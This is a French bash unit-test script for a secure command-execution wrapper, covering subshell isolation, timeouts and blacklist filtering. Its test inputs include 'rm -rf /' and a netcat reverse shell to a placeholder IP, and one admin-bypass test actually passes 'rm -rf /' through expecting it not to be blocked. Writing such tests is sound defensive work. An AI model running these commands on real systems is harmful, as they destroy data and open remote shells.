#!/usr/bin/env bash
# test_t2.sh — Tests unitaires Tâche 2
# Tâche : T2 | Responsable : (équipier T2)
# Dépend de : lib/interfaces.sh, lib/subshell_exec.sh,
#             lib/timeout_watcher.sh, lib/execute_secure.sh

set -uo pipefail

# ─── Chargement des modules ───────────────────────────────────────────────────
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LIB="$SCRIPT_DIR/../lib"

source "$LIB/interfaces.sh"
source "$LIB/subshell_exec.sh"
source "$LIB/timeout_watcher.sh"
source "$LIB/execute_secure.sh"

# ─── Compteurs ────────────────────────────────────────────────────────────────
PASS=0 ; FAIL=0

# ─── Utilitaire ───────────────────────────────────────────────────────────────
check() {
    local name="$1" expected="$2" actual="$3"
    if [[ "$actual" == "$expected" ]]; then
        echo "  ✔  $name"
        (( PASS++ ))
    else
        echo "  ✘  $name"
        echo "       attendu : $expected"
        echo "       obtenu  : $actual"
        (( FAIL++ ))
    fi
}

# ─── Nettoyage des logs de test ───────────────────────────────────────────────
rm -f /tmp/douanes_test.log

echo "==================== TESTS UNITAIRES — Tâche 2 ======================"                 

# =============================================================================
echo ""
echo "── Bloc 1 : subshell_exec.sh ────────────────────────────────"

# Test 1.1 — stdout capturé
init_tmpdir
run_in_subshell "echo hello_douanes" > /dev/null
cmd_pid=$(cat "$PID_FILE")
wait "$cmd_pid" 2>/dev/null
check "stdout capturé correctement" "hello_douanes" "$(get_stdout)"
cleanup_tmpdir

# Test 1.2 — code retour 0
init_tmpdir
run_in_subshell "true" > /dev/null
cmd_pid=$(cat "$PID_FILE")
wait "$cmd_pid" 2>/dev/null
check "code retour 0 (succès)" "0" "$(cat "$RETCODE_FILE")"
cleanup_tmpdir

# Test 1.3 — code retour non nul
init_tmpdir
run_in_subshell "false" > /dev/null
cmd_pid=$(cat "$PID_FILE")
wait "$cmd_pid" 2>/dev/null
check "code retour 1 (échec)" "1" "$(cat "$RETCODE_FILE")"
cleanup_tmpdir

# Test 1.4 — isolation des variables sensibles
# La commande est passée entre guillemets simples pour que $SECRET
# soit évalué DANS le sous-shell (après unset), pas par l'appelant.
init_tmpdir
export SECRET="top_secret"
run_in_subshell 'echo val=${SECRET:-VIDE}' > /dev/null
cmd_pid=$(cat "$PID_FILE")
wait "$cmd_pid" 2>/dev/null
check "variable SECRET isolée" "val=VIDE" "$(get_stdout)"
unset SECRET
cleanup_tmpdir

# Test 1.5 — stderr capturé séparément
init_tmpdir
run_in_subshell "echo out_normal; echo err_normal >&2" > /dev/null
cmd_pid=$(cat "$PID_FILE")
wait "$cmd_pid" 2>/dev/null
check "stdout ne contient pas stderr" "out_normal" "$(get_stdout)"
check "stderr capturé séparément"     "err_normal" "$(get_stderr)"
cleanup_tmpdir

# =============================================================================
echo ""
echo "── Bloc 2 : timeout_watcher.sh ──────────────────────────────"

# Test 2.1 — fin naturelle, code 0
init_tmpdir
watch_process "echo ok_watcher" 10
check "fin naturelle → code 0" "0" "$?"

# Test 2.2 — timeout déclenché, code 255
init_tmpdir
watch_process "sleep 30" 2
check "timeout → code 255" "255" "$?"

# Test 2.3 — get_return_code labels
check "label SUCCESS"          "SUCCESS"          "$(get_return_code 0)"
check "label TIMEOUT"          "TIMEOUT"          "$(get_return_code 255)"
check "label ERROR_NOT_FOUND"  "ERROR_NOT_FOUND"  "$(get_return_code 127)"
check "label KILLED_SIGTERM"   "KILLED_SIGTERM"   "$(get_return_code 143)"

# =============================================================================
echo ""
echo "── Bloc 3 : execute_secure.sh — Cas U1 à U5 ────────────────"

# Test 3.1 — U1 : commande sûre → code 0, stdout affiché
out=$(execute_secure "echo OK" 2>/dev/null | grep -v '^\[')
check "U1 — code retour 0"    "0"  "$?"
check "U1 — stdout transmis"  "OK" "$out"

# Test 3.2 — U1 : autre commande sûre
execute_secure "date" > /dev/null 2>&1
check "U1 — date → code 0" "0" "$?"

# Test 3.3 — U3 : blacklist → code 2, accès refusé
execute_secure "rm -rf /" > /dev/null 2>&1
check "U3 — blacklist → code 2" "2" "$?"

# Test 3.4 — U4 : pattern dangereux → code 2
execute_secure "nc -e /bin/bash 1.2.3.4 4444" > /dev/null 2>&1
check "U4 — pattern dangereux → code 2" "2" "$?"

# Test 3.5 — U3 admin : admin peut forcer une commande BLOCK
# (on vérifie juste que le code n'est PAS 2 = pas de refus sécurité)
execute_secure "rm -rf /" "admin" > /dev/null 2>&1
rc=$?
[[ "$rc" -ne 2 ]] && result="not_blocked" || result="blocked"
check "U3 admin — pas bloqué par sécurité" "not_blocked" "$result"

# Test 3.6 — U5 : timeout → code 255
DOUANES_TIMEOUT=2 execute_secure "sleep 30" > /dev/null 2>&1
check "U5 — timeout → code 255" "255" "$?"

# =============================================================================
echo ""
echo "── Résultats ────────────────────────────────────────────────"
echo ""
echo "  Total   : $(( PASS + FAIL ))"
echo "  ✔ Réussis : $PASS"
echo "  ✘ Échoués : $FAIL"
echo ""
if (( FAIL == 0 )); then
    echo "  ✔ Tous les tests passent — Tâche 2 validée !"
else
    echo "  ⚠ $FAIL test(s) en échec."
    exit 1
fi
echo ""
